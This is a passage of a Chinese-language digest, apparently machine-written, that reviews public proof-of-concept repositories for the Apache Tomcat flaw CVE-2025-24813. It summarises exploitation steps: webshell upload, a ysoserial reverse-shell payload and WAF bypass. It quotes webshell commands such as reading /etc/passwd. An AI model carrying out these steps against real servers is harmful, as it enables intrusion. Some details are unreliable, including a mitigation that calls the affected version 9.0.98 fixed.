CVE-2025-24813是一个高危漏洞，利用条件相对苛刻, 如果目标Tomcat服务器配置不当，攻击者可以利用该漏洞进行RCE或信息泄露，务必及时升级到安全版本。

**项目地址:** [La3B0z/CVE-2025-24813-POC](https://github.com/La3B0z/CVE-2025-24813-POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #15

**来源**: [CVE-2025-24813-Makavellik_POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution.md](../2025/CVE-2025-24813-Makavellik_POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution.md)

## CVE-2025-24813 - Apache Tomcat 远程代码执行

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露或恶意内容注入

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要满足以下条件:
1. 默认Servlet开启了写入功能（默认关闭）
2. 支持部分PUT请求（默认开启）
3. (RCE) 应用使用Tomcat的文件session持久化，且为默认存储位置，应用包含可用于反序列化攻击的库。
4. (信息泄露/内容注入) 存在安全敏感文件上传的目标URL，该URL是公开上传目标URL的子目录，攻击者知道被上传的安全敏感文件的名称，且安全敏感文件也是通过部分PUT上传的。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 漏洞是 Apache Tomcat 中由于路径等效性问题，以及部分 PUT 功能的缺陷导致的远程代码执行或信息泄露漏洞。攻击者可以通过构造恶意的部分 PUT 请求，上传恶意文件覆盖或注入到服务器上的敏感文件，或者在特定条件下利用反序列化漏洞执行任意代码。

**有效性评估：** 根据搜索结果，CVE-2025-24813 漏洞存在活跃的利用案例，并且有公开的 PoC 代码。提供的 PoC 代码描述看起来也比较完整，包括了利用步骤、所需依赖、payload生成方式，以及WAF绕过等功能。因此，可以认为该 PoC 代码具有较高的有效性。

**投毒风险分析：** PoC 代码中存在一定的投毒风险。风险点包括:

1.  **`ysoserial.jar` 依赖：** 该工具本身是用于生成 Java 反序列化 payload 的，如果下载的 `ysoserial.jar` 被篡改，则可能执行恶意代码。
2.  **自定义 Java Payload：** PoC 允许使用自定义的 Java 代码来生成 payload，如果攻击者不小心使用了包含恶意代码的 Java 源文件，也可能导致被攻击。
3.  **代码本身:** 仓库中作者可能在`POC-Exploit_CVE_2025_24813.py`隐藏了后门，导致使用者在不知情的情况下执行了恶意代码。

基于上述分析，投毒风险评估为 10%。

**利用方式总结：**

1.  **漏洞利用入口：** 通过构造恶意的 HTTP PUT 请求，利用 Tomcat 默认 Servlet 的写入功能和部分 PUT 特性。
2.  **路径等效性：** 攻击者利用路径等效性问题（例如，`file.Name` 中的内部点），访问或操作受保护的文件。
3.  **信息泄露/内容注入：** 如果攻击者能够满足上述条件，则可以覆盖或注入恶意代码到服务器的敏感文件中。
4.  **远程代码执行：** 如果目标应用使用了 Tomcat 的文件 session 持久化，并且存在可利用的反序列化库，攻击者可以通过上传恶意 session 文件，触发反序列化漏洞，从而执行任意代码。
5.  **绕过WAF：** PoC 代码中包含 WAF 绕过功能，通过修改 Headers 或者对 Payload 进行拆分等方式，尝试绕过 WAF 的检测。

**项目地址:** [Makavellik/POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution](https://github.com/Makavellik/POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #16

**来源**: [CVE-2025-24813-Mattb709_CVE-2025-24813-PoC-Apache-Tomcat-RCE.md](../2025/CVE-2025-24813-Mattb709_CVE-2025-24813-PoC-Apache-Tomcat-RCE.md)

## CVE-2025-24813-Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 to 11.0.2, 10.1.0-M1 to 10.1.34, 9.0.0.M1 to 9.0.98

**利用条件:** writes enabled for the default servlet, support for partial PUT enabled, application using Tomcat's file-based session persistence with the default storage location, application includes a library that may be leveraged in a deserialization attack 或 writes enabled for the default servlet, support for partial PUT, target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, the security sensitive files also being uploaded via partial PUT

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者通过利用 'file.Name' (Internal Dot) 机制，结合启用了写入功能的 Default Servlet 和部分 PUT 请求支持，可以执行远程代码或进行信息泄露，甚至向上传的文件添加恶意内容。

**有效性评估：** 根据搜索结果，CVE-2025-24813 漏洞已被公开，并且有证据表明已被积极利用。虽然提供的 PoC 代码本身只包含一个 README.md 文件，无法直接证明漏洞的利用，但根据搜索结果，完整的利用链是存在的，并且漏洞本身是可被利用的。这个README.md只是一个占位符，提示存在利用代码。需要进一步搜索才能找到真正可用的POC。

**投毒风险评估：** 提供的 PoC 代码（README.md）非常简单，只包含标题，没有可执行的代码，因此**几乎**不存在直接的投毒风险。风险占比为1%。

**利用方式分析：**

利用 CVE-2025-24813 漏洞有两种主要方式：

1.  **远程代码执行 (RCE)：**
    *   前提条件：
        *   Default Servlet 开启了写入权限。 （默认禁用）
        *   启用了部分 PUT 请求支持。 （默认启用）
        *   应用程序使用 Tomcat 的基于文件的会话持久化，并且使用默认存储位置。
        *   应用程序包含可用于反序列化攻击的库。
    *   攻击过程：攻击者利用部分 PUT 请求上传恶意文件到 Tomcat 的会话存储目录，然后通过反序列化漏洞执行任意代码。

2.  **信息泄露和恶意内容添加：**
    *   前提条件：
        *   Default Servlet 开启了写入权限。（默认禁用）
        *   启用了部分 PUT 请求支持。（默认启用）
        *   存在安全敏感上传的目标 URL，该 URL 是公共上传目标 URL 的子目录。
        *   攻击者知道安全敏感文件的名称。
        *   安全敏感文件也通过部分 PUT 上传。
    *   攻击过程：攻击者利用路径等价漏洞，通过部分 PUT 请求上传恶意文件，覆盖或修改目标 URL 下的安全敏感文件，从而导致信息泄露或向上传的文件添加恶意内容。

总而言之，该漏洞允许未经身份验证的攻击者在满足特定条件的情况下执行远程代码或进行信息泄露，需要尽快修复。


**项目地址:** [Mattb709/CVE-2025-24813-PoC-Apache-Tomcat-RCE](https://github.com/Mattb709/CVE-2025-24813-PoC-Apache-Tomcat-RCE)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #17

**来源**: [CVE-2025-24813-Mattb709_CVE-2025-24813-Scanner.md](../2025/CVE-2025-24813-Mattb709_CVE-2025-24813-Scanner.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞/反序列化

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价漏洞/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需满足以下条件之一：

1.  信息泄露/内容注入：writes enabled for the default servlet, support for partial PUT, a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, security sensitive files also being uploaded via partial PUT。
2.  远程代码执行：writes enabled for the default servlet, support for partial PUT, application was using Tomcat's file based session persistence with the default storage location, application included a library that may be leveraged in a deserialization attack。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是一个存在于Apache Tomcat中的路径等价漏洞，攻击者利用'file.Name'中的内部点，结合启用了写入的Default Servlet，可能导致远程代码执行、信息泄露或向上传文件中添加恶意内容。

**漏洞利用方式：**

此漏洞主要通过利用Tomcat的partial PUT特性和文件路径处理不当来实现。

1. **信息泄露/内容注入：** 攻击者首先需要Default Servlet开启了写入功能，并支持partial PUT。他们可以利用此漏洞上传恶意文件，或者修改已存在的文件内容，进行恶意内容注入，或者泄露安全敏感文件内容，需要利用精心构造的路径来实现攻击。例如，将恶意文件上传到公共目录的子目录下，利用Internal Dot来覆盖其他文件。

2. **远程代码执行：** 如果Tomcat启用了文件存储session，并且应用包含可被反序列化攻击的库，攻击者可以通过上传恶意的序列化文件，并覆盖Tomcat session文件，最终实现RCE。

**POC有效性分析：**

根据提供的POC代码，该脚本尝试通过PUT请求上传一个session文件，然后通过GET请求访问包含session ID的JSP页面。如果GET请求返回500错误，则认为目标存在漏洞，原因是上传的恶意session文件导致了反序列化异常。此方法可能可以验证漏洞的存在性，但需要目标环境满足特定的配置要求（例如，启用文件session存储并存在易受攻击的反序列化库）。搜索引擎结果也表明此漏洞在野外被积极利用。

**投毒风险分析：**

POC代码本身主要是漏洞验证，并无明显的恶意投毒行为。代码中使用了requests库进行HTTP请求，并根据响应状态码判断漏洞是否存在。 但是仍然存在一些风险：

*   **依赖风险：** 代码依赖于requests、pandas和colorama库，这些库可能存在安全漏洞，如果使用了被篡改的库，则可能引入安全风险。
*   **代码执行风险：** 虽然代码本身没有直接的恶意行为，但如果攻击者修改了代码，例如添加了反向shell等恶意逻辑，则可能实现远程代码执行。
*   **误报风险：** 如果目标服务器存在WAF或其他安全防护措施，可能会导致扫描结果出现误报。

综合考虑，此POC代码的投毒风险较低，大概为5%。主要风险在于对第三方库的依赖以及代码被篡改的可能性。

**项目地址:** [Mattb709/CVE-2025-24813-Scanner](https://github.com/Mattb709/CVE-2025-24813-Scanner)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #18

**来源**: [CVE-2025-24813-MuhammadWaseem29_CVE-2025-24813.md](../2025/CVE-2025-24813-MuhammadWaseem29_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/路径穿越

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要默认Servlet开启写入功能（默认关闭），支持partial PUT（默认开启），以及目标URL为公共上传URL的子目录，攻击者需要知道敏感文件名，并且敏感文件也通过partial PUT上传。 或者需要应用使用Tomcat的基于文件的session持久化，并且包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813 是一个 Apache Tomcat 中的路径等价漏洞，允许攻击者通过构造包含 `../` 序列的恶意请求，绕过路径验证，从而实现远程代码执行或信息泄露。

**有效性：**
根据漏洞库信息、搜索结果以及提供的PoC代码，可以判断该PoC代码有效。搜索结果中多个来源表明该漏洞已被实际利用，并且存在公开的PoC。PoC代码展示了如何利用 PUT 方法上传包含恶意代码的 JSP 文件到 Tomcat 的 webapps 目录，从而实现远程代码执行。

**投毒风险：**
提供的PoC代码的主要功能是上传一个包含命令执行功能的 JSP 文件。该JSP文件允许攻击者通过 GET 参数 `cmd` 执行任意系统命令。PoC本身的功能是直接的，并没有发现隐藏的、非预期的恶意行为，例如：
*   篡改系统文件
*   植入持久性后门
*   窃取敏感信息并外传
*   利用其他漏洞
因此，根据现有信息，可以认为投毒风险较低。虽然使用了Runtime.getRuntime().exec来执行命令，但是这个是PoC的需要，目的是验证RCE。判断为0%.

**利用方式：**
1.  **利用条件确认：** 目标Tomcat服务器需要满足以下条件：
    *   默认Servlet开启写入功能（`readonly` 参数设置为 `false`）。
    *   支持 partial PUT 请求（默认开启）。
    *  攻击目标满足特定的文件存储结构和命名规则(参考漏洞描述)
    *   或者应用使用了Tomcat的基于文件的session持久化机制且包含可用于反序列化攻击的库
2.  **恶意JSP上传：** 攻击者使用 PUT 方法，将包含恶意代码的 JSP 文件上传到 Tomcat 服务器。PoC 中使用了路径穿越技巧（`../`），将文件上传到 webapps/ROOT 目录下，从而绕过访问限制。
3.  **命令执行：** 攻击者通过访问上传的 JSP 文件，并传递 `cmd` 参数，执行任意系统命令。PoC 中演示了如何使用 `cat /etc/passwd` 命令读取系统密码文件。

**搜索引擎结果总结：**
搜索结果表明该漏洞已存在实际攻击案例，并且 CISA 已将其添加到已知被利用漏洞目录中。多个安全厂商和博客都对该漏洞进行了分析和披露，并提供了检测和缓解建议。

**项目地址:** [MuhammadWaseem29/CVE-2025-24813](https://github.com/MuhammadWaseem29/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #19

**来源**: [CVE-2025-24813-N0c1or_CVE-2025-24813_POC.md](../2025/CVE-2025-24813-N0c1or_CVE-2025-24813_POC.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence / Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 through 11.0.2, 10.1.0-M1 through 10.1.34, 9.0.0.M1 through 9.0.98

**利用条件:** 对于路径等价漏洞：默认Servlet启用写入权限，支持partial PUT，存在目标URL是公共上传URL的子目录，攻击者知道敏感文件名，并且敏感文件通过partial PUT上传。对于反序列化漏洞：默认Servlet启用写入权限，支持partial PUT，应用程序使用Tomcat基于文件的session持久化默认存储位置，应用程序包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 100%

## 详情

根据漏洞库信息和搜索结果，CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，它涉及到路径等价和反序列化两个方面。路径等价漏洞允许攻击者通过特殊的路径构造（例如使用内部点 `.Name`）来访问或修改受保护的文件。如果同时启用了 Default Servlet 的写入权限和 Partial PUT 支持，攻击者可以上传恶意文件，导致信息泄露或远程代码执行。反序列化漏洞则允许攻击者通过上传包含恶意序列化数据的 session 文件，结合 Tomcat 的文件 session 持久化机制以及应用程序中存在的易受攻击的反序列化库，最终实现远程代码执行。

漏洞利用方式：

1.  **路径等价攻击：** 攻击者利用 `file.Name` 这样的路径构造绕过访问控制，结合 Default Servlet 的写入权限和 Partial PUT 支持，上传恶意 JSP 文件或覆盖现有的配置文件。
2.  **反序列化攻击：** 攻击者首先确定目标应用程序使用了 Tomcat 的默认文件 session 持久化位置，然后构造恶意的序列化 payload，该 payload 利用应用程序依赖中的反序列化漏洞执行任意代码。 攻击者通过 Partial PUT 上传包含此 payload 的 session 文件到 Tomcat 的 session 存储目录，当 Tomcat 反序列化该 session 时，payload 被触发，导致远程代码执行。

提供的 POC 代码 `CVE-2025-24813_POC.py` 旨在利用反序列化漏洞。代码中包含了一个 Java 序列化 payload (payload_01)，它被编码为十六进制字符串。 该 payload 似乎是为了利用 `TemplatesImpl` 类中的漏洞来执行任意代码。 脚本首先尝试连接到目标 Tomcat 服务器，然后使用 Partial PUT 请求上传包含恶意 payload 的文件。  payload 包含占位符 {payload}，说明此exp并非完整，需要二次编辑才可使用。

有效性分析： 根据提供的代码片段，结合漏洞描述， 该POC 代码利用反序列化漏洞，因此，在满足反序列化漏洞的条件时，POC有效。

投毒风险分析：POC 代码中使用了硬编码的 payload 和目标 URL。攻击者可以很容易地修改这些参数以执行恶意操作，例如上传后门或窃取敏感数据，而不仅仅是执行简单的命令。  因此，该 POC 具有高投毒风险。并且其中存在占位符，说明需要进行二次编辑,那么投毒风险就是百分之百。


**项目地址:** [N0c1or/CVE-2025-24813_POC](https://github.com/N0c1or/CVE-2025-24813_POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #20

**来源**: [CVE-2025-24813-Olabanji10_Apache-GOExploiter.md](../2025/CVE-2025-24813-Olabanji10_Apache-GOExploiter.md)

## CVE-2025-24813

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行或信息泄露

**影响版本:** Apache Tomcat 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要开启Default Servlet的写入功能，允许Partial PUT，并且满足特定的目录结构或使用Tomcat的文件Session持久化机制。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞。如果满足以下条件，攻击者可以进行远程代码执行或泄露敏感信息:

1.  **信息泄露/恶意内容注入:**
    *   Default Servlet 的写入功能已启用（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   存在安全敏感文件上传的目标 URL，该 URL 是公共上传目标 URL 的子目录。
    *   攻击者知道要上传的安全敏感文件的名称。
    *   安全敏感文件通过 Partial PUT 上传。

2.  **远程代码执行:**
    *   Default Servlet 的写入功能已启用（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   应用程序使用 Tomcat 的基于文件的 Session 持久化，使用默认存储位置。
    *   应用程序包含一个可以在反序列化攻击中利用的库。

**漏洞利用方式：**

*   **信息泄露/恶意内容注入：** 攻击者可以利用路径等价漏洞，通过构造恶意请求，覆盖或读取特定的安全敏感文件。
*   **远程代码执行：** 攻击者利用 Partial PUT 功能上传恶意构造的序列化 session 文件，并结合目标应用中存在的可被利用的反序列化漏洞，最终实现远程代码执行。

**POC分析：**

提供的 Go 代码通过 PUT 方法上传 JSP webshell 到多个预定义的目录中。它首先检测目标是否是Tomcat服务器，然后尝试在不同的目录下上传 `update_log.jsp` 文件，其中包含一个简单的命令执行界面。如果上传成功，它会将 URL 写入到 `Shelled.txt` 文件中。

**投毒风险分析：**

该POC代码的主要目的是利用漏洞上传webshell，本身没有明显的投毒行为。虽然webshell本身是一种恶意代码，但是这是漏洞利用的一部分，不应被视为投毒。 风险评估为5%。

**搜索引擎结果：**

多个搜索结果表明 CVE-2025-24813 漏洞已经被积极利用，远程代码执行是主要的攻击目标。

**项目地址:** [Olabanji10/Apache-GOExploiter](https://github.com/Olabanji10/Apache-GOExploiter)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #21

**来源**: [CVE-2025-24813-Shivshantp_CVE-2025-24813.md](../2025/CVE-2025-24813-Shivshantp_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat PUT JSP RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要目标Tomcat实例启用默认servlet的写入功能 (disabled by default) 和 支持 partial PUT (enabled by default)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中一个路径等价漏洞，允许未经身份验证的攻击者通过 PUT 请求上传恶意 JSP 文件来执行远程代码。漏洞利用依赖于两个关键配置：1. Tomcat 默认 Servlet 的写入功能必须启用（默认情况下禁用）。 2. 必须支持 partial PUT（默认启用）。

**有效性：**
根据提供的漏洞利用代码（`exploit/1. exploit_cve_2025_24813.py`），该 PoC 尝试通过 PUT 请求将一个包含命令执行功能的 JSP webshell 上传到目标 Tomcat 服务器，默认路径为 `/shell.jsp`。 成功上传后，该 PoC 尝试通过发送带有 `cmd` 参数的 GET 请求来执行系统命令，验证是否成功执行远程代码。

**投毒风险：**
该仓库主要包含漏洞利用脚本，webshell 以及 Dockerfile 等配置，作者在docker配置中创建了`/usr/local/tomcat/conf/Catalina/localhost/ROOT.xml`,并设置了`<Context privileged='true' antiResourceLocking='false' swallowOutput='true' />`, 如果docker hub上存在投毒行为,可能会导致用户的敏感信息泄露。经过分析，未发现明显的恶意代码或后门。`exploit/2.shell.jsp` 只是webshell 的另一个副本，与PoC脚本一致。总体来说，代码的投毒风险较低，约为5%。

**利用方式：**
1.  **前提条件检查：** 确保目标 Tomcat 服务器满足漏洞利用的条件（默认 Servlet 写入已启用，支持 partial PUT）。
2.  **上传恶意 JSP 文件：** 使用 PUT 请求将包含恶意代码的 JSP 文件（如 `shell.jsp`）上传到目标服务器。`exploit/1. exploit_cve_2025_24813.py` 脚本即实现了此步骤。
3.  **执行远程代码：** 成功上传 JSP 文件后，通过访问该文件并传递命令参数（如 `shell.jsp?cmd=whoami`）来执行任意系统命令。

**缓解措施：**
*   升级到受影响的 Apache Tomcat 版本的修复版本 (11.0.3, 10.1.35, or 9.0.98).
*   禁用默认 servlet 的写入功能。
*   限制对 Tomcat 服务器的访问权限。

**项目地址:** [Shivshantp/CVE-2025-24813](https://github.com/Shivshantp/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #22

**来源**: [CVE-2025-24813-absholi7ly_POC-CVE-2025-24813.md](../2025/CVE-2025-24813-absholi7ly_POC-CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence and Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE), 信息泄露, 文件覆盖

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和恶意文件上传

**影响版本:** 11.0.0-M1 through 11.0.2, 10.1.0-M1 through 10.1.34, 9.0.0.M1 through 9.0.98

**利用条件:** 以下条件全部满足时，可导致信息泄露和/或文件覆盖：默认Servlet的写入已启用（默认禁用），支持部分PUT（默认启用），安全敏感上传的目标URL是公共上传目标URL的子目录，攻击者知道安全敏感文件的名称，且安全敏感文件也通过部分PUT上传。以下条件全部满足时，可导致远程代码执行：默认Servlet的写入已启用（默认禁用），支持部分PUT（默认启用），应用程序使用Tomcat基于文件的会话持久化和默认存储位置，应用程序包含可能在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2025-24813 存在于 Apache Tomcat 的路径等价处理中，攻击者可以通过利用 'file.Name' (内部点) 绕过安全检查。此漏洞可能导致远程代码执行、信息泄露，或通过启用了写入功能的默认Servlet将恶意内容添加到已上传的文件中。根据漏洞库信息和搜索结果，利用条件较为苛刻，需要特定的配置，如启用默认Servlet写入、支持部分PUT等。漏洞利用代码 `CVE_2025_24813.py` 尝试通过 PUT 请求上传恶意 payload 到会话文件存储目录，如果成功，可以触发反序列化漏洞，实现远程代码执行。代码包含检查 Servlet 是否可写的函数 `check_writable_servlet`，以及生成 ysoserial payload 的函数 `generate_ysoserial_payload`或者Java Payload的函数 `generate_java_payload`。该利用方式依赖于 Tomcat 的文件型 session 持久化机制，以及服务器上存在可被利用的反序列化 gadget。 鉴于代码可能包含恶意 payload 生成和上传功能，存在高风险的投毒可能性。

**项目地址:** [absholi7ly/POC-CVE-2025-24813](https://github.com/absholi7ly/POC-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #23

**来源**: [CVE-2025-24813-beyond-devsecops_CVE-2025-24813.md](../2025/CVE-2025-24813-beyond-devsecops_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要默认Servlet的写入启用(readonly=false, allowPut=true, allowPartialPut=true)，应用使用Tomcat的文件Session持久化存储，应用包含可用于反序列化攻击的library

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个远程代码执行漏洞，该漏洞允许攻击者在满足特定条件的情况下执行任意代码。

**漏洞利用有效性分析：**

根据搜索引擎结果，该漏洞在发布后不久就出现了在野利用，多个安全厂商也发布了相关的分析报告和检测规则，表明该漏洞具有较高的实际威胁性。POC代码中，通过修改`web.xml`文件，开启了默认Servlet的写入权限和PUT方法，然后利用ysoserial生成反序列化payload，通过分块PUT请求上传payload，最后访问特定URL触发反序列化，从而执行反弹shell命令。如果目标环境符合漏洞描述中的所有条件（Default Servlet 开启写入、支持 partial PUT、使用文件session存储、存在可利用的反序列化库），那么该POC代码可以有效实现RCE。

**投毒风险分析：**

POC代码主要由shell脚本和Dockerfile组成。脚本负责构建、运行Tomcat镜像、生成payload、上传payload、触发漏洞等操作。Dockerfile用于构建包含漏洞环境的Tomcat镜像。仔细检查这些文件，发现潜在的投毒点可能在于:

*   **ysoserial payload生成：** 脚本使用`ysoserial.jar`生成payload，如果攻击者替换了`ysoserial.jar`文件，可能会植入恶意代码。但是脚本中包含了直接从`https://jitpack.io/com/github/frohoff/ysoserial/master-b7d0f27b46-1/ysoserial-master-b7d0f27b46-1.jar`下载`ysoserial.jar` 的代码，除非该链接被篡改，否则可以排除。虽然存在该风险，但因为是从已知源下载，所以该风险相对较低。
*   **Dockerfile修改：** Dockerfile通过sed命令修改`web.xml`文件，开启了`readonly=false`。如果`sed`命令被篡改，可能导致其他恶意配置。

总体来说，该POC代码的投毒风险较低，因为所有操作都相对透明，且依赖已知的工具和配置。最主要的风险在于ysoserial的下载源被篡改的可能性。因此，投毒风险评估为5%。

**漏洞利用方式：**

1.  **环境准备：** 构建包含漏洞版本的Apache Tomcat环境。Dockerfile中配置了允许PUT请求，这是一个关键的先决条件。
2.  **Payload生成：** 使用ysoserial工具，结合CommonsBeanutils1链，生成包含反弹shell命令的序列化payload。
3.  **Payload上传：** 通过分块PUT请求，将payload上传到服务器。
4.  **触发反序列化：** 访问特定的URL，触发反序列化漏洞，执行payload中的命令，从而获得反弹shell。

**项目地址:** [beyond-devsecops/CVE-2025-24813](https://github.com/beyond-devsecops/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #24

**来源**: [CVE-2025-24813-brs6412_CVE-2025-24813.md](../2025/CVE-2025-24813-brs6412_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-Path Equivalence/Deserialization

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致信息泄露和远程代码执行

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** Default Servlet 启用写入 (默认禁用), 启用 partial PUT (默认启用), 目标 URL 是公共上传 URL 的子目录（对于信息泄露），或者应用使用 Tomcat 的基于文件的会话持久化且使用默认存储位置，以及应用程序包含可能被利用于反序列化攻击的库（对于 RCE）。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

根据CVE信息和搜索结果，CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，与DefaultServlet处理文件上传的逻辑相关。如果启用了 DefaultServlet 的写入功能，并且启用了 partial PUT 支持，攻击者可以通过构造包含 `file.Name` (内部点) 的路径来覆盖敏感文件或执行恶意代码。漏洞可能导致远程代码执行、信息泄露，或向已上传文件中添加恶意内容。

**有效性：**

提供的代码是一个利用反序列化漏洞进行远程代码执行的POC。它包含一个易受攻击的Servlet（`ExploitServlet.java`），该Servlet接受序列化的Java对象，并使用 `ObjectInputStream` 对其进行反序列化。`SafeGadget.java` 中提供了一个简单的Gadget，它在反序列化时会写入`/tmp/pwn.txt`。利用方式是上传恶意构造的序列化对象到 `/vuln-app/vulnerable_endpoint`，触发反序列化，从而执行任意代码。结合CVE描述，如果Tomcat配置允许，并满足利用条件（partial PUT, session持久化等），则该POC有效。

**投毒风险：**

从代码上看，投毒的概率较低（约 5%）。主要风险点在于`SafeGadget.java`。尽管名称是 "SafeGadget"，但它实际上执行了文件写入操作。这本身不是投毒，而是漏洞利用的一部分。真正的投毒风险可能在于：

1.  **更隐蔽的后门：** 虽然给出的例子写入 "Pwned!" 到文件，但实际的Gadget可能执行更隐蔽的操作，例如添加用户、执行系统命令等。
2.  **供应链投毒：** 如果攻击者能够控制构建环境，他们可能会修改 `ExploitServlet.java` 或添加额外的依赖项，从而引入后门或恶意功能。

由于给出的代码非常简单，并且漏洞利用的目的是明确的（通过反序列化写入文件），因此直接投毒的风险相对较低。但是，在实际的利用场景中，攻击者可能会使用更复杂的Gadget，从而隐藏恶意行为。

**利用方式：**

1.  **信息泄露/文件覆盖：** 如果满足以下条件：
    *   Default Servlet 启用写入
    *   支持 partial PUT
    *   目标 URL 是公共上传 URL 的子目录
    *   攻击者知道敏感文件名
    *   敏感文件也使用 partial PUT 上传
    攻击者可以使用路径等价绕过，例如 `public_upload/../../sensitive_file.txt` 覆盖敏感文件。
2.  **远程代码执行：** 如果满足以下条件：
    *   Default Servlet 启用写入
    *   支持 partial PUT
    *   应用使用 Tomcat 的基于文件的会话持久化和默认存储位置
    *   应用包含可用于反序列化攻击的库
    攻击者可以利用反序列化漏洞，例如通过上传恶意构造的序列化session文件到session存储目录中，从而执行任意代码。POC代码展示了基本的反序列化利用方式。实际利用中，需要找到Tomcat实例中可用的Gadget链。 

**项目地址:** [brs6412/CVE-2025-24813](https://github.com/brs6412/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #25

**来源**: [CVE-2025-24813-charis3306_CVE-2025-24813.md](../2025/CVE-2025-24813-charis3306_CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence and Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价及反序列化远程代码执行

**影响应用:** Apache Tomcat

